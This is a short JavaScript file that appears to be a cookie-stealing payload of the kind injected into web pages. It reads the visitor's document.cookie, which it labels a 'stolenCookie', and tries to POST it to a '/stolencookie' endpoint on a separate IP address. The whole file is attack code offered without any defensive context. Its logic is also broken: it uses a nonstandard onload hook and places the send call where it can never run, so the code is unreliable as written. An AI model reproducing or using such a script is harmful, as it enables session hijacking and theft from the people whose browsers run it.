
document.onload = () => {
    sendData();
}


function getCookies(){
    var stolenCookie = document.cookie;
    console.log(stolenCookie);
    return stolenCookie;
}


function sendData(){
    var xhr = new XMLHttpRequest();
    var url = "https://192.168.1.158/stolencookie"
    xhr.open("POST", url, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onreadystatechange = () => {
        if(xhr.readyState === 4){
            var co = getCookies();
            xhr.send(co);
        }
    }
}